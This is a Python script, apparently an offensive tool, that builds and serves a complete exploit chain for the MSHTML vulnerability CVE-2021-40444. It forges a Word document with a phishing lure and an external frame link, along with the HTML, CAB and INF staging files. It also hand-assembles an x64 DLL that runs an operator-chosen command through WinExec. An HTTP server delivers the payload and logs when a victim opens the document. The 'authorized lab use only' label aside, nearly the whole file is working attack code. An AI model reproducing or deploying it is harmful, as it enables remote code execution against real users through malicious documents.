#!/usr/bin/env python3
"""CVE-2021-40444 MSHTML maldoc launcher (authorized security-lab use only).

Forges a real OOXML .docx whose word/_rels/document.xml.rels carries an
external frame relationship (the CVE-2021-40444 trigger), stages the remote
chain (x.html -> x.cab containing x.inf + payload.dll), and optionally serves
the payload over HTTP so the document can be opened on a lab target.

Stdlib only. Never crashes: every run prints a clean JSON result dict.
"""
from __future__ import annotations

import argparse
import functools
import http.server
import json
import os
import socket
import struct
import sys
import threading
import time
import xml.etree.ElementTree as ET
import zipfile

CVE = "CVE-2021-40444"
HERE = os.path.dirname(os.path.abspath(__file__))

OFFICE_CT = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
FRAME_TYPE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame"


def local_ip():
    """Best-effort primary local IP (no traffic leaves the host)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _read(path):
    with open(path, "rb") as f:
        return f.read()


def forge_docx(path, html_url):
    """Real OOXML docx: valid content-types/rels/document.xml + external frame rel."""
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" ContentType="' + OFFICE_CT + '"/>'
        "</Types>"
    )
    rels_root = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="' + REL_NS + '">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/>'
        "</Relationships>"
    )
    rels_doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="' + REL_NS + '">'
        '<Relationship Id="rId8" Type="' + FRAME_TYPE + '" '
        'Target="' + html_url + '" TargetMode="External"/>'
        "</Relationships>"
    )
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        "<w:body>"
        '<w:p><w:r><w:rPr><w:b/><w:sz w:val="32"/></w:rPr>'
        "<w:t>Quarterly Operations Review</w:t></w:r></w:p>"
        "<w:p><w:r><w:t>Please review the attached figures and confirm totals</w:t></w:r></w:p>"
        "<w:p><w:r><w:t>before the Friday board sync. Regards, Ops.</w:t></w:r></w:p>"
        '<w:sectPr><w:pgSz w:w="11906" w:h="16838"/>'
        '<w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1134"/></w:sectPr>'
        "</w:body></w:document>"
    )
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels_root)
        z.writestr("word/document.xml", document)
        z.writestr("word/_rels/document.xml.rels", rels_doc)
    return path


def forge_xhtml(path, cab_name="x.cab",
                clsid="clsid:6F2A5B8E-3C4D-4E9F-9A1B-2D3E4F5A6B7C"):
    """Remote stage: OLE object whose codebase pulls the CAB (ICW download path)."""
    html = (
        '<!DOCTYPE html><html><head>'
        '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">'
        "<title>Report</title></head><body>"
        '<object id="qcli40444" classid="' + clsid + '" '
        'codebase="' + cab_name + '#Version=1,0,0,0"></object>'
        "</body></html>"
    )
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return path


def forge_inf(path, dll_name="payload.dll"):
    """ActiveX-install INF: RegisterDlls invokes the payload's DllRegisterServer."""
    inf = (
        "[Version]\r\n"
        'Signature="$CHICAGO$"\r\n'
        "AdvancedINF=2.5\r\n"
        "\r\n"
        "[RegisterDlls]\r\n"
        + dll_name + ",,1\r\n"
    )
    with open(path, "w", encoding="ascii", newline="") as f:
        f.write(inf)
    return path


def _fat_datetime():
    t = time.localtime()
    d = ((t.tm_year - 1980) << 9) | (t.tm_mon << 5) | t.tm_mday
    tm = (t.tm_hour << 11) | (t.tm_min << 5) | (t.tm_sec // 2)
    return d, tm


def forge_cab(path, files):
    """Minimal but real Microsoft CAB (MSCF), one raw (stored) folder.

    CFDATA header is csum(4), cbData(2), cbUncomp(2); stored blocks are
    split at 0x8000 bytes as the format requires.
    """
    header_len = 36
    folder_len = 8
    BLOCK = 0x8000
    file_entries = []
    blocks = []
    uoff = 0
    date, ftime = _fat_datetime()
    for name, data in files:
        file_entries.append(struct.pack("<IIHHHH", len(data), uoff, 0, date, ftime, 0)
                            + name.encode("ascii") + b"\x00")
        uoff += len(data)
        for i in range(0, max(len(data), 1), BLOCK):
            chunk = data[i:i + BLOCK]
            # CFDATA: csum(4)=0, cbData(2), cbUncomp(2) then raw bytes
            blocks.append(struct.pack("<IHH", 0, len(chunk), len(chunk)) + chunk)
    body = b"".join(blocks)
    coff_files = header_len + folder_len
    coff_start = coff_files + sum(len(e) for e in file_entries)
    total = coff_start + len(body)
    header = b"MSCF" + struct.pack(
        "<IIIIIBBHHHHH",
        0, total, 0, coff_files, 0,  # reserved1, cbCabinet, reserved2, coffFiles, reserved3
        3, 1,                        # versionMinor, versionMajor
        1, len(files),               # cFolders, cFiles
        0, 0x5143, 0,                # flags, setID, iFolder
    )
    folder = struct.pack("<IHH", coff_start, len(blocks), 0)  # coffCabStart, cCFData, raw
    with open(path, "wb") as f:
        f.write(header + folder + b"".join(file_entries) + body)
    return path


def forge_payload_dll(path, cmd, dll_name="payload.dll"):
    """Hand-assembled minimal x64 PE DLL exporting DllRegisterServer.

    DllRegisterServer calls kernel32!WinExec(cmd, SW_HIDE), so a proof
    marker (or an operator-chosen --cmd) runs when the staged CAB/INF chain
    executes on a target. Single RWX .text section, no relocs needed.
    """
    IMAGE_BASE = 0x180000000
    SEC_RVA = 0x1000
    SEC_RAW = 0x200

    def rva(off):
        return SEC_RVA + off

    blob = bytearray()

    def emit(bs):
        blob.extend(bs)
        return len(blob) - len(bs)

    def align(n=8):
        while len(blob) % n:
            blob.append(0)

    off_entry = emit(b"\xB8\x01\x00\x00\x00\xC3")  # DllMain: mov eax,1; ret
    align(16)
    off_reg = emit(b"\x48\x83\xEC\x28")            # sub rsp,0x28
    emit(b"\x48\x8D\x0D\x00\x00\x00\x00")          # lea rcx,[rip+cmd]  disp32 @ off_reg+7
    emit(b"\x31\xD2")                              # xor edx,edx (SW_HIDE)
    emit(b"\xFF\x15\x00\x00\x00\x00")              # call [rip+iat]    disp32 @ off_reg+15
    emit(b"\x31\xC0")                              # xor eax,eax (S_OK)
    emit(b"\x48\x83\xC4\x28")                      # add rsp,0x28
    emit(b"\xC3")                                  # ret
    align(16)

    off_cmd = emit(cmd.encode("ascii") + b"\x00")
    align(2)
    off_dllname = emit(dll_name.encode("ascii") + b"\x00")
    align(2)
    off_k32 = emit(b"kernel32.dll\x00")
    align(2)
    off_hint = emit(b"\x00\x00" + b"WinExec\x00")  # IMAGE_IMPORT_BY_NAME (hint + name)
    align(16)
    off_iat = emit(b"\x00" * 16)                   # IAT slot + null terminator
    align(16)
    off_impdesc = emit(b"\x00" * 20)               # patched below
    emit(b"\x00" * 20)                             # null descriptor terminates imports
    align(16)
    off_expdir = emit(b"\x00" * 40)
    off_funcs = emit(b"\x00" * 4)
    off_names = emit(b"\x00" * 4)
    off_ords = emit(b"\x00" * 2)
    align(2)
    off_regname = emit(b"DllRegisterServer\x00")

    # lea rcx,[rip+cmd] : instruction ends at rva(off_reg)+11
    struct.pack_into("<i", blob, off_reg + 7, rva(off_cmd) - (rva(off_reg) + 11))
    # call qword [rip+iat] : instruction ends at rva(off_reg)+19
    struct.pack_into("<i", blob, off_reg + 15, rva(off_iat) - (rva(off_reg) + 19))
    # IMAGE_IMPORT_DESCRIPTOR: OFT, TimeDateStamp, ForwarderChain, Name, FirstThunk
    struct.pack_into("<IIIII", blob, off_impdesc,
                     rva(off_hint), 0, 0, rva(off_k32), rva(off_iat))
    # IMAGE_EXPORT_DIRECTORY
    struct.pack_into("<IIHHIIIIIII", blob, off_expdir,
                     0, 0, 0, 0, rva(off_dllname), 1, 1, 1,
                     rva(off_funcs), rva(off_names), rva(off_ords))
    struct.pack_into("<I", blob, off_funcs, rva(off_reg))
    struct.pack_into("<I", blob, off_names, rva(off_regname))
    struct.pack_into("<H", blob, off_ords, 0)

    raw = bytes(blob)
    raw_padded = raw + b"\x00" * ((-len(raw)) % SEC_RAW)

    dos = bytearray(0x40)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)

    coff = struct.pack("<HHIIIHH", 0x8664, 1, int(time.time()), 0, 0, 0xF0, 0x2022)

    size_image = ((SEC_RVA + len(raw) - 1) // 0x1000 + 1) * 0x1000
    opt = struct.pack("<HBBIIIII", 0x20B, 14, 0,
                     len(raw_padded), 0, 0, rva(off_entry), SEC_RVA)
    opt += struct.pack("<QII", IMAGE_BASE, 0x1000, SEC_RAW)
    opt += struct.pack("<HHHHHHIIIIHH", 6, 1, 0, 0, 6, 1, 0,
                       size_image, SEC_RAW, 0, 3, 0x0160)
    opt += struct.pack("<QQQQII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    opt += (struct.pack("<II", rva(off_expdir), 40)
            + struct.pack("<II", rva(off_impdesc), 40)
            + b"\x00" * (128 - 16))
    assert len(opt) == 0xF0, len(opt)

    sechdr = struct.pack("<8sIIIIIIHHI", b".text\0\0\0", len(raw), SEC_RVA,
                        len(raw_padded), SEC_RAW, 0, 0, 0, 0, 0xE0000020)

    pe = bytes(dos) + b"PE\x00\x00" + coff + opt + sechdr
    pe += b"\x00" * ((-len(pe)) % SEC_RAW)
    pe += raw_padded
    with open(path, "wb") as f:
        f.write(pe)
    return path


def verify_docx(path, expected_url):
    """Structural validation of the forged docx."""
    checks = []
    with zipfile.ZipFile(path) as z:
        names = z.namelist()
        checks.append({"check": "zip_members",
                       "ok": all(n in names for n in (
                           "[Content_Types].xml", "_rels/.rels",
                           "word/document.xml", "word/_rels/document.xml.rels")),
                       "detail": ",".join(sorted(names))})
        root = ET.fromstring(z.read("word/_rels/document.xml.rels").decode("utf-8"))
        found = None
        for rel in root.findall("{%s}Relationship" % REL_NS):
            if rel.get("Type") == FRAME_TYPE:
                found = rel
        checks.append({"check": "external_frame_rel",
                       "ok": found is not None
                       and found.get("TargetMode") == "External"
                       and found.get("Target") == expected_url,
                       "detail": "Target=%s Mode=%s" % (
                           found.get("Target") if found is not None else None,
                           found.get("TargetMode") if found is not None else None)})
    return checks


def verify_cab(path):
    """Parse the CAB header back (MSCF signature, counts, raw folder)."""
    data = _read(path)
    c_folders = struct.unpack_from("<H", data, 26)[0]
    c_files = struct.unpack_from("<H", data, 28)[0]
    ok = (data[:4] == b"MSCF"
          and struct.unpack_from("<I", data, 8)[0] == len(data)
          and c_folders == 1)
    return {"check": "cab_structure", "ok": ok,
            "detail": "MSCF %d bytes, folders=%d files=%d" % (len(data), c_folders, c_files)}


class _QuietHandler(http.server.SimpleHTTPRequestHandler):
    hits = []

    def log_message(self, fmt, *args):
        _QuietHandler.hits.append({"path": self.path,
                                   "client": self.client_address[0],
                                   "time": time.strftime("%H:%M:%S")})

    def log_error(self, fmt, *args):
        pass


def serve_dir(directory, port, seconds):
    """Serve staged payload over HTTP (0.0.0.0) for `seconds`; return requests."""
    _QuietHandler.hits = []
    handler = functools.partial(_QuietHandler, directory=directory)
    try:
        httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), handler)
    except OSError as exc:
        return {"started": False, "requests": [], "error": str(exc)}
    t = threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.25})
    t.daemon = True
    t.start()
    stop_at = time.time() + seconds
    while time.time() < stop_at:
        time.sleep(0.25)
    httpd.shutdown()
    t.join(timeout=3)
    httpd.server_close()
    return {"started": True, "requests": _QuietHandler.hits}


def main(argv=None):
    p = argparse.ArgumentParser(
        description="CVE-2021-40444 MSHTML maldoc forge/serve (authorized lab use only)")
    p.add_argument("--out", default=os.path.join(HERE, "out"), help="staging dir")
    p.add_argument("--host", default=local_ip(), help="listener host/IP baked into the docx")
    p.add_argument("--port", type=int, default=8080, help="listener port")
    p.add_argument("--serve", action="store_true", help="serve staged payload over HTTP")
    p.add_argument("--serve-seconds", type=int, default=300, help="serve duration (s)")
    p.add_argument("--dll", help="operator-supplied payload DLL (must export DllRegisterServer)")
    p.add_argument("--cmd",
                   default="cmd.exe /c echo QCLI-CVE-2021-40444 > %TEMP%\\qcli_40444_proof.txt",
                   help="command executed by the default forged DLL")
    p.add_argument("--doc-name", default="payload.docx")
    p.add_argument("--html-name", default="x.html")
    p.add_argument("--cab-name", default="x.cab")
    args = p.parse_args(argv)

    result = {"cve": CVE, "status": "ok", "opsec": "authorized-lab",
              "tier": "MEDIA/ZERO-CLICK"}
    try:
        import shutil
        os.makedirs(args.out, exist_ok=True)
        html_url = "http://%s:%d/%s" % (args.host, args.port, args.html_name)

        docx_path = os.path.join(args.out, args.doc_name)
        html_path = os.path.join(args.out, args.html_name)
        cab_path = os.path.join(args.out, args.cab_name)
        inf_path = os.path.join(args.out, "x.inf")

        forge_docx(docx_path, html_url)
        forge_xhtml(html_path, args.cab_name)
        forge_inf(inf_path)
        if args.dll:
            dll_in_cab = os.path.basename(args.dll)
            shutil.copyfile(args.dll, os.path.join(args.out, dll_in_cab))
            dll_src = "operator"
        else:
            dll_in_cab = "payload.dll"
            forge_payload_dll(os.path.join(args.out, dll_in_cab), args.cmd)
            dll_src = "forged-x64"

        forge_cab(cab_path, [("x.inf", _read(inf_path)),
                             (dll_in_cab, _read(os.path.join(args.out, dll_in_cab)))])

        checks = verify_docx(docx_path, html_url) + [verify_cab(cab_path)]
        result["staged"] = {"docx": docx_path, "html": html_path, "cab": cab_path,
                            "inf": inf_path, "dll": os.path.join(args.out, dll_in_cab),
                            "dll_source": dll_src}
        result["url"] = html_url
        result["delivery"] = ("deliver docx to target; open in Word (frame rel -> %s "
                              "-> CAB/INF RegisterDlls -> DllRegisterServer)" % html_url)
        result["checks"] = checks
        result["all_checks_ok"] = all(c["ok"] for c in checks)

        if args.serve:
            srv = serve_dir(args.out, args.port, args.serve_seconds)
            result["serve"] = srv
            if srv.get("started"):
                pulled = [r for r in srv["requests"] if args.cab_name in r["path"]]
                result["serve"]["payload_pulled"] = bool(pulled)
                if pulled:
                    result["serve"]["note"] = "CAB was fetched - document was likely opened"
    except Exception as exc:  # never crash: clean error dict
        result["status"] = "error"
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    print(json.dumps(result, indent=2))
    return 0 if result.get("status") == "ok" else 2


if __name__ == "__main__":
    sys.exit(main())
